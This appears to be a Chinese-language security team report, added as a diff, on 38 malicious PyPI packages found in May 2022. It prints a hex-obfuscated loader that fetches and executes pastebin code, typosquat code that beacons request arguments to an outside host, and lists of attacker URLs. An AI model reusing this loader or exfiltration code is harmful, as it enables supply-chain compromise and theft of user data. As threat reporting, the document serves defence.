@@ -1,0 +1,109 @@
+
+2022年5月份，天问Python供应链威胁监测模块共捕捉到38个恶意包，并于发现后立马反馈PyPI官方，通知维护者将这些包删除。根据这些恶意包的行为，它们可被分为三类：恶意文件下载执行类、Typosquatting类、可疑链接访问/敏感信息回传类。
+恶意文件下载执行类
+
+
+包名	上传时间	作者	行为
+reverse-shell-bugbounty	2022-05-10	Nir Ohfeld	包安装时创建反弹Shell
+supplychaind2	2022-05-17	zepjtpjwepn	包安装时访问hxxps://pastebin.com/raw/74tUPCJy，执行链接内代码
+supplychaindemo1	2022-05-17	zepjtpjwepn	包安装时访问hxxps://pastebin.com/raw/74tUPCJy，执行链接内代码
+supplychaindemo	2022-05-18	zepjtpjwepn	包安装时访问hxxps://pastebin.com/raw/74tUPCJy，执行链接内代码
+supplychaind4	2022-05-18	zepjtpjwepn	包安装时访问hxxps://pastebin.com/raw/74tUPCJy，执行链接内代码
+supplychaindemo2	2022-05-18	zepjtpjwepn	包安装时访问hxxps://pastebin.com/raw/74tUPCJy，执行链接内代码
+supplychaind5	2022-05-18	zepjtpjwepn	包安装时访问hxxps://pastebin.com/raw/74tUPCJy，执行链接内代码
+supplychaindemo9	2022-05-18	zepjtpjwepn	包安装时访问hxxps://pastebin.com/raw/74tUPCJy，执行链接内代码
+dsource	2022-05-19	Tinus Green	包安装时访问covenant.thinkgreencorp.net:4449，下载可执行脚本，形成反弹Shell
+其中，作者zepjtpjwepn上传多个恶意包，均在上传约5分钟后自己手动删除，我们怀疑他是在为真正的攻击作准备，其编码后代码如下。
+
+1
+2
+3
+4
+5
+6	import builtins
+import requests
+
+url = bytes.fromhex('68747470733a2f2f706173746562696e2e636f6d2f7261772f714d6675555a746e').decode()
+payload = requests.get(url).text
+getattr(builtins, bytes.fromhex('65786563').decode())(payload)
+在进行解码后我们得到如下结果
+
+1
+2
+3
+4
+5
+6	import builtins
+import requests
+
+url = "https://pastebin.com/raw/74tUPCJy"
+payload = requests.get(url).text
+getattr(builtins, 'exec')(payload)
+其通过requests.get函数获取链接内的代码并通过getattr和exec函数执行。当我们试图访问链接时得到404报错，这更加坚信了我们对其“攻击测试”的猜测。
+其代码逻辑和上传之后立马删除的特点与半年前我们发现的恶意包作者vkobnzbfdjixqkxrql上传的包相同，区别仅为半年前恶意包内访问链接为zevel.site/payload-02。详情可见【天问】PyPI恶意包汇总（20211120-20211126）中“脚本下载类”。
+Typosquatting类
+
+
+包名	上传时间	作者	行为
+rquests	2022-05-28	Orange Alice	恶意模仿requests包，并将用户信息回传
+reuests	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+requess	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+reqquests	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+requestts	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+requessts	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+requuests	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+equests	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+requeests	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+rrequests	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+reequests	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+requuests	2022-05-31	Orange Alice	恶意模仿requests包，并将用户信息回传
+包作者Orange Alice于2022年5月28日凌晨1点首次上传恶意模仿包rquests，其取用requests最新版本2.2.8并在包内定义函数get及post。用户若安装requests时不小心打错名字，则会受到此次typosquatting攻击。恶意包内代码如下。
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12	import urllib.request
+import os
+import base64
+
+urllib.request.urlopen("https://serene-springs-50769.herokuapp.com/log?from=rquest&os=" + os.name)
+
+def get(*args, **kwargs):
+    urllib.request.urlopen("https://serene-springs-50769.herokuapp.com/log?from=rquest&params=" + base64.b64encode((str(args) + str(kwargs)).encode()).decode())
+
+
+def post(*args, **kwargs):
+    urllib.request.urlopen("https://serene-springs-50769.herokuapp.com/log?from=rquest&params=" + base64.b64encode((str(args) + str(kwargs)).encode()).decode())
+该恶意包在模块内定义了get和post两个requests内的主要函数，当用户在使用get/post时会将敏感信息回传且并不会收到报错反馈，这也给恶意包提供了更强的隐蔽性。
+在我们将rquests反馈并移除后，包作者于2022年5月31日开始报复性上传typosquatting恶意包11个，这些包均在当晚被官方删除。
+可疑链接访问/敏感信息回传
+
+
+包名	上传时间	作者	行为
+clipboard-copy	2022-05-17	noob-07	敏感信息回传至hxxps://ca1ncditc6bga0fikdigamhy8gt7kokrm.oast.live
+raisin-microservice	2022-05-29	stevieg	敏感信息回传至hxxps://ca9l8efg4umslm0p7490ay16coqezumuk.oast.site
+fooOne	2022-05-18	fakeuser	访问链接hxxps://cex.io/api/last_price/BTC/USD
+Fake44	2022-05-03	fakeuser	访问链接hxxps://zevel.site/wannacry
+xorriso	2022-05-25	zoroo	访问链接hxxps://c921v2m7q5k0000z3hm0gfdfhpeyyyyyg.interactred.net/xor
+malpack-aravazhi	2022-05-25	zoroo	访问链接hxxps://c921v2m7q5k0000z3hm0gfdfhpeyyyyyg.interactred.net/xor
+sadsafgdhfgh	2022-05-30	zepjtpjwepn	访问链接hxxps://zevel.site/wannacry
+vdvfdhfjghj	2022-05-30	zepjtpjwepn	访问链接hxxps://zevel.site/wannacry
+gdfgdfg	2022-05-30	zepjtpjwepn	访问链接hxxps://zevel.site/wannacry
+gjhfrkjghdfkghfdk	2022-05-30	zepjtpjwepn	访问链接hxxps://zevel.site/wannacry
+danimal	2022-05-18	zepjtpjwepn	访问链接hxxps://zevel.site/wannacry
+strangemalwar	2022-05-11	zepjtpjwepn	访问链接hxxps://zevel.site/payload-02
+michmal	2022-05-09	zepjtpjwepn	访问链接hxxps://zevel.site/payload-02
+desayuno-partnerslab	2022-05-27	raulruix3	访问链接hxxps://zevel.site/wannacry
+myruala	2022-05-25	ruala1	访问链接hxxps://zevel.site/wannacry
+jms11	2022-05-09	nehbha	访问链接hxxps://zevel.site/payload-02
+ktest-haha	2022-05-09	ktestcx	访问链接hxxps://zevel.site/wannacry
+与以往攻击手法不同的是，上述恶意包中大部分都不再将恶意代码放在setup.py内，即用户在安装恶意包时并不会触发。攻击者转而将恶意代码放在module的__init__.py内（类似攻击手法可见【天问】攻击者瞄准Discord，窃取银行卡信息），用户只有在import时才会访问恶意链接或者将敏感信息回传，这给这些恶意包提供了极强的持续性。
+我们将继续关注PyPI生态上的恶意包情况及这些恶意包作者的动向。
